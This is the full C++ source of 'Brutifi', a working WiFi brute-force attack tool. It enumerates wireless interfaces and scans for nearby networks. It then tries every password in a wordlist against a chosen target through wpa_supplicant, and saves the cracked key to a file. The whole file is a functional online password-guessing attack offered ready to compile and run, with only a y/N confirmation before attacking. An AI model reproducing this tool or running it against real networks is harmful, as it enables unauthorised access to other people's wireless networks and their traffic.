/*
 * Brutifi - WiFi Brute Force
 * Author: Nedjmeddine
 * Compile: make
 */

#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <sstream>
#include <cstdlib>
#include <cstring>
#include <unistd.h>
#include <sys/wait.h>
#include <sys/stat.h>
#include <regex>
#include <algorithm>
#include <signal.h>
#include <dirent.h>
#include <iomanip>

#define RED     "\033[91m"
#define GREEN   "\033[92m"
#define YELLOW  "\033[93m"
#define BLUE    "\033[94m"
#define MAGENTA "\033[95m"
#define CYAN    "\033[96m"
#define WHITE   "\033[97m"
#define BOLD    "\033[1m"
#define END     "\033[0m"

struct Network {
    std::string ssid;
    std::string bssid;
    double signal;
    int channel;
    std::string security;
};

struct WifiInterface {
    std::string name;
    std::string type;
    std::string driver;
    std::string mac;
    std::string state;
};

void banner() {
    std::cout << CYAN << BOLD <<
        "    ██████╗ ██████╗ ██╗   ██╗████████╗██╗███████╗██╗\n"
        "    ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██║██╔════╝██║\n"
        "    ██████╔╝██████╔╝██║   ██║   ██║   ██║█████╗  ██║\n"
        "    ██╔══██╗██╔══██╗██║   ██║   ██║   ██║██╔══╝  ██║\n"
        "    ██████╔╝██║  ██║╚██████╔╝   ██║   ██║██║     ██║\n"
        "    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚═╝╚═╝     ╚═╝\n"
        << END << YELLOW << "         WiFi Brute Force | Nedjmeddine\n" << END;
}

int run_cmd(const std::vector<std::string>& cmd, std::string& out, std::string& err, int timeout = 10) {
    int pipe_out[2], pipe_err[2];
    pipe(pipe_out);
    pipe(pipe_err);

    std::vector<char*> args;
    for (const auto& s : cmd) args.push_back(const_cast<char*>(s.c_str()));
    args.push_back(nullptr);

    pid_t pid = fork();
    if (pid == 0) {
        dup2(pipe_out[1], STDOUT_FILENO);
        dup2(pipe_err[1], STDERR_FILENO);
        close(pipe_out[0]); close(pipe_out[1]);
        close(pipe_err[0]); close(pipe_err[1]);
        execvp(args[0], args.data());
        _exit(127);
    }

    close(pipe_out[1]);
    close(pipe_err[1]);

    char buf[4096];
    ssize_t n;
    out.clear(); err.clear();

    alarm(timeout);
    while ((n = read(pipe_out[0], buf, sizeof(buf)-1)) > 0) {
        buf[n] = '\0';
        out += buf;
    }
    while ((n = read(pipe_err[0], buf, sizeof(buf)-1)) > 0) {
        buf[n] = '\0';
        err += buf;
    }
    alarm(0);

    close(pipe_out[0]);
    close(pipe_err[0]);

    int status;
    waitpid(pid, &status, 0);
    return WIFEXITED(status) ? WEXITSTATUS(status) : -1;
}

void check_root() {
    if (geteuid() != 0) {
        std::cerr << RED << "[!] Root required. Run: sudo ./brutifi" << END << std::endl;
        exit(1);
    }
}

std::string expand_path(const std::string& path) {
    if (path.empty() || path[0] != '~') return path;
    const char* home = getenv("HOME");
    if (!home) home = getenv("USERPROFILE");
    if (!home) home = "/root";
    return std::string(home) + path.substr(1);
}

std::string get_default_passlist() {
    const char* home = getenv("HOME");
    if (!home) home = "/root";
    std::vector<std::string> candidates = {
        std::string(home) + "/passlist.txt",
        std::string(home) + "/wordlists/passlist.txt",
        std::string(home) + "/wordlist.txt",
        "/usr/share/wordlists/passlist.txt",
        "/opt/wordlists/passlist.txt"
    };
    for (const auto& c : candidates) {
        if (access(c.c_str(), F_OK) == 0) return c;
    }
    return std::string(home) + "/passlist.txt";
}

bool is_wireless_interface(const std::string& iface) {
    std::string path = "/sys/class/net/" + iface + "/wireless";
    return access(path.c_str(), F_OK) == 0;
}

std::string get_interface_type(const std::string& iface) {
    std::string path = "/sys/class/net/" + iface + "/device/modalias";
    std::ifstream f(path);
    if (!f) return "unknown";
    std::string modalias;
    std::getline(f, modalias);
    if (modalias.find("usb") == 0) return "USB";
    if (modalias.find("pci") == 0 || modalias.find("pcie") == 0) return "PCIe";
    if (modalias.find("sdio") == 0) return "SDIO";
    if (modalias.find("platform") == 0) return "Built-in";
    return "Other";
}

std::string get_interface_driver(const std::string& iface) {
    std::string path = "/sys/class/net/" + iface + "/device/driver";
    char resolved[PATH_MAX];
    if (realpath(path.c_str(), resolved)) {
        std::string driver(resolved);
        size_t pos = driver.find_last_of('/');
        if (pos != std::string::npos) return driver.substr(pos + 1);
    }
    return "unknown";
}

std::string get_interface_mac(const std::string& iface) {
    std::string path = "/sys/class/net/" + iface + "/address";
    std::ifstream f(path);
    std::string mac;
    if (f) std::getline(f, mac);
    return mac.empty() ? "unknown" : mac;
}

std::string get_interface_state(const std::string& iface) {
    std::string path = "/sys/class/net/" + iface + "/operstate";
    std::ifstream f(path);
    std::string state;
    if (f) std::getline(f, state);
    return state.empty() ? "unknown" : state;
}

std::vector<WifiInterface> enumerate_interfaces() {
    std::vector<WifiInterface> ifaces;
    DIR* dir = opendir("/sys/class/net");
    if (!dir) return ifaces;

    struct dirent* entry;
    while ((entry = readdir(dir)) != nullptr) {
        std::string name(entry->d_name);
        if (name == "." || name == "..") continue;
        if (!is_wireless_interface(name)) continue;

        WifiInterface wi;
        wi.name = name;
        wi.type = get_interface_type(name);
        wi.driver = get_interface_driver(name);
        wi.mac = get_interface_mac(name);
        wi.state = get_interface_state(name);
        ifaces.push_back(wi);
    }
    closedir(dir);
    return ifaces;
}

std::string select_interface(const std::vector<WifiInterface>& ifaces) {
    if (ifaces.empty()) {
        std::cerr << RED << "[!] No wireless interfaces found" << END << std::endl;
        return "";
    }

    if (ifaces.size() == 1) {
        std::cout << GREEN << "[+] Found single interface: " << ifaces[0].name << END << std::endl;
        return ifaces[0].name;
    }

    std::cout << "\n" << BOLD << "#########################################################" << END << std::endl;
    std::cout << BOLD << "ID   Interface   Type       Driver              MAC                State    " << END << std::endl;
    std::cout << BOLD << "---------------------------------------------------------" << END << std::endl;

    for (size_t i = 0; i < ifaces.size(); ++i) {
        const auto& w = ifaces[i];
        const char* state_col = (w.state == "up" || w.state == "dormant") ? GREEN : YELLOW;

        std::cout << CYAN << std::left << std::setw(5) << (i + 1)
                  << WHITE << std::left << std::setw(12) << w.name
                  << std::left << std::setw(11) << w.type
                  << std::left << std::setw(20) << w.driver
                  << std::left << std::setw(19) << w.mac
                  << state_col << std::left << std::setw(10) << w.state
                  << END << std::endl;
    }
    std::cout << BOLD << "#########################################################" << END << std::endl;

    while (true) {
        std::cout << YELLOW << "[?] Select interface ID (1-" << ifaces.size() << "): " << END << std::flush;

        if (!std::cin.good()) {
            std::cin.clear();
            std::cin.ignore(10000, '\n');
        }

        std::string choice;
        std::getline(std::cin, choice);

        if (choice == "q" || choice == "Q") return "";

        try {
            size_t idx = std::stoul(choice) - 1;
            if (idx < ifaces.size()) {
                std::cout << GREEN << "[+] Using: " << ifaces[idx].name << END << std::endl;
                return ifaces[idx].name;
            }
            std::cerr << RED << "[!] Invalid selection" << END << std::endl;
        } catch (...) {
            std::cerr << RED << "[!] Enter a valid number" << END << std::endl;
        }
    }
}

std::vector<Network> scan_iwlist(const std::string& iface) {
    std::vector<Network> nets;
    std::string out, err;
    if (run_cmd({"iwlist", iface, "scan"}, out, err, 20) != 0) return nets;

    size_t pos = 0;
    while ((pos = out.find("Cell ", pos)) != std::string::npos) {
        size_t end = out.find("Cell ", pos + 5);
        std::string cell = out.substr(pos, end == std::string::npos ? std::string::npos : end - pos);

        Network net = {"", "", 0.0, 0, "Open"};

        std::regex bssid_re("Address: ([0-9A-Fa-f:]{17})");
        std::smatch bm;
        if (std::regex_search(cell, bm, bssid_re)) net.bssid = bm[1];

        std::regex ssid_re("ESSID:\"([^\"]*)\"");
        std::smatch sm;
        if (std::regex_search(cell, sm, ssid_re)) net.ssid = sm[1];

        std::regex sig_re("Signal level=(-?\\d+)");
        std::smatch sgm;
        if (std::regex_search(cell, sgm, sig_re)) net.signal = std::stod(sgm[1]);

        std::regex ch_re("Channel:(\\d+)");
        std::smatch cm;
        if (std::regex_search(cell, cm, ch_re)) net.channel = std::stoi(cm[1]);

        if (cell.find("Encryption key:on") != std::string::npos) {
            if (cell.find("WPA2") != std::string::npos) net.security = "WPA2";
            else if (cell.find("WPA") != std::string::npos) net.security = "WPA";
            else net.security = "WEP";
        }

        if (!net.ssid.empty()) nets.push_back(net);
        pos = end == std::string::npos ? std::string::npos : end;
    }
    return nets;
}

std::vector<Network> scan_iw(const std::string& iface) {
    std::vector<Network> nets;
    std::string out, err;

    run_cmd({"iw", "dev", iface, "scan", "trigger"}, out, err, 10);
    sleep(2);

    if (run_cmd({"iw", "dev", iface, "scan"}, out, err, 15) != 0) return nets;

    Network current = {"", "", 0.0, 0, "Open"};
    std::istringstream iss(out);
    std::string line;

    while (std::getline(iss, line)) {
        size_t start = line.find_first_not_of(" \t");
        if (start != std::string::npos) line = line.substr(start);

        if (line.find("BSS ") == 0) {
            if (!current.ssid.empty()) nets.push_back(current);
            current = {"", "", 0.0, 0, "Open"};
            size_t sp = line.find(' ');
            size_t ep = line.find('(');
            if (sp != std::string::npos && ep != std::string::npos)
                current.bssid = line.substr(sp+1, ep-sp-1);
        }
        else if (line.find("SSID: ") != std::string::npos && line.find("DS") != 0) {
            current.ssid = line.substr(6);
        }
        else if (line.find("signal: ") != std::string::npos) {
            try {
                size_t p = line.find("signal: ") + 8;
                current.signal = std::stod(line.substr(p));
            } catch (...) {}
        }
        else if (line.find("DS Parameter set: channel") != std::string::npos) {
            try {
                size_t p = line.find("channel") + 7;
                current.channel = std::stoi(line.substr(p));
            } catch (...) {}
        }
        else if (line.find("RSN:") != std::string::npos) current.security = "WPA2";
        else if (line.find("WPA:") != std::string::npos && current.security == "Open") current.security = "WPA";
    }
    if (!current.ssid.empty()) nets.push_back(current);
    return nets;
}

std::vector<Network> scan_networks(const std::string& iface, const std::string& method) {
    std::cout << CYAN << "[*] Scanning on " << iface << "..." << END << std::endl;
    std::vector<Network> nets;

    if (method == "iwlist" || method == "auto") {
        nets = scan_iwlist(iface);
        if (!nets.empty()) return nets;
    }
    if (method == "iw" || method == "auto") {
        nets = scan_iw(iface);
        if (!nets.empty()) return nets;
    }

    std::cerr << RED << "[!] No networks found" << END << std::endl;
    return nets;
}

Network select_network(const std::vector<Network>& networks) {
    if (networks.empty()) return Network{};

    std::vector<Network> unique;
    for (const auto& n : networks) {
        auto it = std::find_if(unique.begin(), unique.end(),
            [&](const Network& u){ return u.ssid == n.ssid; });
        if (it == unique.end()) unique.push_back(n);
        else if (n.signal > it->signal) *it = n;
    }

    std::sort(unique.begin(), unique.end(),
        [](const Network& a, const Network& b){ return a.signal > b.signal; });

    std::cout << "\n" << BOLD << "#########################################################" << END << std::endl;
    std::cout << BOLD << "ID   SSID                        Signal    Ch    Sec      " << END << std::endl;
    std::cout << BOLD << "---------------------------------------------------------" << END << std::endl;

    for (size_t i = 0; i < unique.size(); ++i) {
        const auto& n = unique[i];
        const char* sig_col = n.signal > -50 ? GREEN : n.signal > -70 ? YELLOW : RED;
        const char* sec_col = n.security == "WEP" ? RED : (n.security == "WPA" || n.security == "WPA2") ? YELLOW : GREEN;

        std::cout << CYAN << std::left << std::setw(5) << (i + 1)
                  << WHITE << std::left << std::setw(28) << n.ssid
                  << sig_col << std::left << std::setw(10) << (int)n.signal
                  << WHITE << std::left << std::setw(6) << n.channel
                  << sec_col << std::left << std::setw(10) << n.security
                  << END << std::endl;
    }
    std::cout << BOLD << "#########################################################" << END << std::endl;

    while (true) {
        std::cout << YELLOW << "[?] Select network ID (1-" << unique.size() << ") or q: " << END << std::flush;

        if (!std::cin.good()) {
            std::cin.clear();
            std::cin.ignore(10000, '\n');
        }

        std::string choice;
        std::getline(std::cin, choice);
        if (choice == "q" || choice == "Q") return Network{};

        try {
            size_t idx = std::stoul(choice) - 1;
            if (idx < unique.size()) {
                std::cout << GREEN << "[+] Target: " << unique[idx].ssid << END << std::endl;
                return unique[idx];
            }
            std::cerr << RED << "[!] Invalid" << END << std::endl;
        } catch (...) {
            std::cerr << RED << "[!] Enter a number" << END << std::endl;
        }
    }
}

std::string wpa_config(const std::string& ssid, const std::string& psk) {
    return "ctrl_interface=/var/run/wpa_supplicant\nupdate_config=1\nnetwork={\n    ssid=\"" + ssid +
           "\"\n    psk=\"" + psk + "\"\n    key_mgmt=WPA-PSK\n}\n";
}

bool test_password(const std::string& iface, const std::string& ssid,
                   const std::string& psk, int timeout) {
    std::string conf = "/tmp/brutifi_" + std::to_string(getpid()) + ".conf";
    std::string out, err;

    {
        std::ofstream f(conf);
        f << wpa_config(ssid, psk);
    }
    chmod(conf.c_str(), 0600);

    run_cmd({"pkill", "-f", "wpa_supplicant.*" + iface}, out, err, 2);
    usleep(300000);

    if (run_cmd({"wpa_supplicant", "-i", iface, "-c", conf, "-B",
                 "-f", "/tmp/brutifi.log"}, out, err, 5) != 0) {
        unlink(conf.c_str());
        return false;
    }

    usleep(1500000);
    for (int i = 0; i < timeout; ++i) {
        if (run_cmd({"wpa_cli", "-i", iface, "status"}, out, err, 3) == 0) {
            if (out.find("wpa_state=COMPLETED") != std::string::npos) {
                run_cmd({"dhcpcd", "-n", iface}, out, err, 10);
                usleep(1500000);
                if (run_cmd({"ip", "addr", "show", iface}, out, err, 3) == 0)
                    if (out.find("inet ") != std::string::npos) {
                        unlink(conf.c_str());
                        run_cmd({"pkill", "-f", "wpa_supplicant.*" + iface}, out, err, 2);
                        return true;
                    }
            }
            if (out.find("wpa_state=WRONG_KEY") != std::string::npos) {
                unlink(conf.c_str());
                run_cmd({"pkill", "-f", "wpa_supplicant.*" + iface}, out, err, 2);
                return false;
            }
        }
        sleep(1);
    }

    unlink(conf.c_str());
    run_cmd({"pkill", "-f", "wpa_supplicant.*" + iface}, out, err, 2);
    return false;
}

void brute_force(const std::string& iface, const Network& target,
                 const std::string& passlist, int timeout) {
    std::cout << "\n" << MAGENTA << "============================================================" << END << std::endl;
    std::cout << BOLD << MAGENTA << "  BRUTIFI ATTACK" << END << std::endl;
    std::cout << MAGENTA << "  Target: " << target.ssid << END << std::endl;
    std::cout << MAGENTA << "  BSSID:  " << target.bssid << END << std::endl;
    std::cout << MAGENTA << "============================================================" << END << std::endl;

    std::ifstream f(passlist);
    if (!f) {
        std::cerr << RED << "[!] Cannot read passlist" << END << std::endl;
        return;
    }

    std::vector<std::string> passwords;
    std::string line;
    while (std::getline(f, line)) {
        line.erase(0, line.find_first_not_of(" \t\r\n"));
        line.erase(line.find_last_not_of(" \t\r\n") + 1);
        if (!line.empty()) passwords.push_back(line);
    }

    std::cout << CYAN << "[*] " << passwords.size() << " passwords loaded" << END << std::endl;

    std::cout << YELLOW << "[*] Preparing " << iface << "..." << END << std::endl;
    std::string out, err;
    run_cmd({"pkill", "-f", "wpa_supplicant.*" + iface}, out, err, 2);
    usleep(300000);
    run_cmd({"ip", "link", "set", iface, "down"}, out, err, 5);
    usleep(300000);
    run_cmd({"iw", "dev", iface, "set", "type", "managed"}, out, err, 5);
    usleep(300000);
    run_cmd({"ip", "link", "set", iface, "up"}, out, err, 5);
    usleep(500000);
    std::cout << GREEN << "[+] Ready" << END << std::endl;

    time_t start = time(nullptr);
    size_t tested = 0;

    for (size_t i = 0; i < passwords.size(); ++i) {
        tested++;
        double elapsed = difftime(time(nullptr), start);
        double rate = elapsed > 0 ? (double)tested / elapsed : 0;

        printf("%s[%zu/%zu] %s%s%s %s(%.1f/s)%s\r",
            WHITE, i+1, passwords.size(), YELLOW, passwords[i].c_str(),
            WHITE, CYAN, rate, END);
        fflush(stdout);

        if (test_password(iface, target.ssid, passwords[i], timeout)) {
            printf("\n");
            std::cout << GREEN << "============================================================" << END << std::endl;
            std::cout << GREEN << BOLD << "  [+] CRACKED!" << END << std::endl;
            std::cout << GREEN << BOLD << "  [+] SSID: " << target.ssid << END << std::endl;
            std::cout << GREEN << BOLD << "  [+] PSK:  " << passwords[i] << END << std::endl;
            std::cout << GREEN << "============================================================" << END << std::endl;

            const char* home = getenv("HOME");
            if (!home) home = "/root";
            std::string outpath = std::string(home) + "/brutifi_" + target.ssid + ".txt";
            std::ofstream of(outpath);
            of << "SSID: " << target.ssid << "\nPSK: " << passwords[i] << "\nBSSID: " << target.bssid << "\n";
            std::cout << GREEN << "[+] Saved: " << outpath << END << std::endl;
            return;
        }
        usleep(150000);
    }

    printf("\n\n");
    std::cout << RED << "[!] Not found. Tested " << tested << " passwords" << END << std::endl;
}

int main(int argc, char** argv) {
    signal(SIGINT, [](int){ exit(0); });
    banner();
    check_root();

    std::string config_path = (argc > 1) ? argv[1] : "config.json";
    std::string iface, passlist, method = "auto";
    int timeout = 15;

    std::ifstream cf(config_path);
    if (cf) {
        std::string json((std::istreambuf_iterator<char>(cf)),
                          std::istreambuf_iterator<char>());
        cf.close();

        auto extract = [&](const std::string& key) -> std::string {
            size_t p = json.find("\"" + key + "\"");
            if (p == std::string::npos) return "";
            p = json.find(":", p);
            if (p == std::string::npos) return "";
            p = json.find("\"", p);
            if (p == std::string::npos) return "";
            size_t e = json.find("\"", p+1);
            return json.substr(p+1, e-p-1);
        };

        std::string v = extract("interface");
        if (!v.empty()) iface = v;
        v = extract("passlist_path");
        if (!v.empty()) passlist = expand_path(v);
        v = extract("scan_method");
        if (!v.empty()) method = v;
        v = extract("timeout");
        if (!v.empty()) try { timeout = std::stoi(v); } catch (...) {}
    }

    auto ifaces = enumerate_interfaces();

    if (!iface.empty()) {
        auto it = std::find_if(ifaces.begin(), ifaces.end(),
            [&](const WifiInterface& w){ return w.name == iface; });
        if (it != ifaces.end()) {
            std::cout << CYAN << "[*] Using configured interface: " << iface << END << std::endl;
        } else {
            std::cerr << YELLOW << "[!] Configured interface '" << iface << "' not found" << END << std::endl;
            iface = select_interface(ifaces);
            if (iface.empty()) {
                std::cerr << RED << "[!] No interface selected" << END << std::endl;
                exit(1);
            }
        }
    } else {
        iface = select_interface(ifaces);
        if (iface.empty()) {
            std::cerr << RED << "[!] No interface selected" << END << std::endl;
            exit(1);
        }
    }

    if (passlist.empty()) {
        passlist = get_default_passlist();
        std::cout << CYAN << "[*] Auto-detected passlist: " << passlist << END << std::endl;
    }

    std::cout << CYAN << "[*] Interface: " << iface << END << std::endl;
    std::cout << CYAN << "[*] Passlist:  " << passlist << END << std::endl;

    std::vector<std::string> tools = {"iw", "wpa_supplicant", "wpa_cli", "dhcpcd"};
    std::string out, err;
    for (const auto& t : tools) {
        if (run_cmd({"which", t}, out, err, 2) != 0) {
            std::cerr << RED << "[!] Missing: " << t << END << std::endl;
            exit(1);
        }
    }

    auto networks = scan_networks(iface, method);
    if (networks.empty()) {
        std::cerr << RED << "[!] No networks. Check interface." << END << std::endl;
        exit(1);
    }

    Network target = select_network(networks);
    if (target.ssid.empty()) exit(0);

    std::cout << "\n" << RED << "[!] Attack " << target.ssid << "? (y/N): " << END << std::flush;
    std::string confirm;
    std::getline(std::cin, confirm);
    if (confirm != "y" && confirm != "Y") {
        std::cout << YELLOW << "[*] Aborted" << END << std::endl;
        exit(0);
    }

    brute_force(iface, target, passlist, timeout);
    return 0;
}
